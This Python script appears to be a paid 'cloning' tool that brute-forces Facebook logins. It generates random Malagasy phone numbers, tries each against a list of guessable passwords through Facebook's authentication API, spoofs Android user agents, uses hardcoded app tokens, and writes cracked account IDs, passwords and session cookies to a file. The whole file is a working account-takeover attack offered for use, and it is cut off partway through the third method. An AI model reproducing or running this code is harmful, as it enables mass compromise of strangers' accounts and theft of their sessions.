#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re,pycurl,io
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import random
import string



model2 ="""M2101K6G
Aquaris U Plus
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V""".splitlines()

os.system('espeak -b 1000 "welcome axn command"')
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}─────────────────────────────────────────────────')
#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for xd in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    #ua
    
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#──────────────{ UA-FOR-RANDOM }──────────────#
def fuckx():
	model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	return bal
#──────────────{ LOGO }──────────────#
logo = f"""
     \033[1;32m
                 ╔╗───╔═══╗╔═╗╔═╗
                 ║║───║╔═╗║╚╗╚╝╔╝
                 ║║───║╚══╗─╚╗╔╝─
                 ║║─╔╗╚══╗║─╔╝╚╗─
                 ║╚═╝║║╚═╝║╔╝╔╗╚╗
                 ╚═══╝╚═══╝╚═╝╚═╝   V 0.1.0
{warna}{H}✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺{H}
{H}✺>>>>>>>>>>>>{H}  {M}Owner{M}     {H}<==>{H} {M}RedFargun{M}  {H}<<<<<<<<<<<✺{H}
{H}✺>>>>>>>>>>>>{H}  {M}TOOL NAME{M} {H}<==>{H} {warna}{M}Nathan{M}{warna}     {H}<<<<<<<<<<<✺{H}
{H}✺>>>>>>>>>>>>{H}  {M}STATUE{M}    {H}<==>{H} {M}PAID{M}       {H}<<<<<<<<<<<✺{H}
{H}✺>>>>>>>>>>>>{H}  {M}Facebook{M}  {H}<==>{H} {M}Lŭčkã Sënt{M}  {H}<<<<<<<<<<✺{H}
{H}✺>>>>>>>>>>>>{H}  {M}Tools{M}     {H}<==>{H} {warna}[{M}VERSION 0.1.0{warna}]{warna}  {H}<<<<<✺{H}
✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺{H}"""
#──────────────{ MENU }──────────────#
def asif():
	model = random.choice(["X6815C,", "Infinix X6511B","Infinix X678B","Infinix X605","Infinix X6710","Infinix X6711","Infinix X6716B","Infinix X6820","Infinix X677","Infinix X695","Infinix X6832","Infinix Zero 4 Plus"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/443010639;FBDM/"+"{density=2.4,width=1080,height=2280}"+f";FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{model};FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	return bal
#vuda

def menu():
	clear()
	print(f"{C}|1| RANDOM CLONING")
#	print(f"{C}|2| EXIT CLONING")
	linex()
	option = input(f'{C}|?| CHOICE : ')
	if option in ['A','1']:__Randmx__()
	elif option in ['B','2']:exit()
	else:
		print(f'\n{C}|=| OPTION FOUND');menu()
#──────────────{ RANDOM }──────────────#
def __Randmx__():
	clear()
	print(f"{C}|1| MALAGASY CLONING");linex();option = input(f'{C}|?| CHOICE : ')
	if option in ['A','1']:__MALAGASYx__()
	elif option in ['B','2']:exit()
	else:
		print(f'\n{C}|=| OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __MALAGASYx__():
    user=[]
    clear()
    print(f'{C}|=| EXAMPLE : 26132 / 26133 / 26134 / 26138');linex();code=input(f'{C}|?| CHOICE  : ')
    clear()
    print(f'{C}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{C}|?| CHOICE  : '))
    except ValueError:
        limit=99999
    clear()
    print(f"{C}|1| METHOD M1 ");print(f"{C}|2| METHOD M2 ");print(f"{C}|3| METHOD M3 ");print(f"{C}|4| METHOD M4 ");print(f"{C}|5| METHOD M5 ");linex();methodx = input(f'{C}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Asifx:
        clear()
        tl=str(len(user))
        print(f'{C}|=| RANDOM UID : {tl} ');print(f'{C}|=| SIM CODE   : {code} ');print(f"{C}|=| TURN [ON/OFF] AIRPLANE MODE FOR BEST RESULTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'tiavina','sariaka','malala','sarobidy','nantenaina','sarika','nirina','fitahiana','fitahina','salohy','vadiko','nomena','sahaza','tahiry','tolotra','nirina','niaina','nomena','fitiavana','fanilo','faneva','malala','nekena','andriamanitra','malagasy','antananarivo','mamiko','mamako','fanantenana','natiora']
            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{C}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{C}|LsX-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': fuckx(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook..com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|L s X_OK| {str(uid)} | {pas} ')
                                open('/sdcard/CLONING/LsX-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{C}|LsX-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|L s X_OK| {str(uid)} | {pas} ')
                                open('/sdcard/CLONING/LsX-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M3 }──────────────#
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{C}|LsX-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
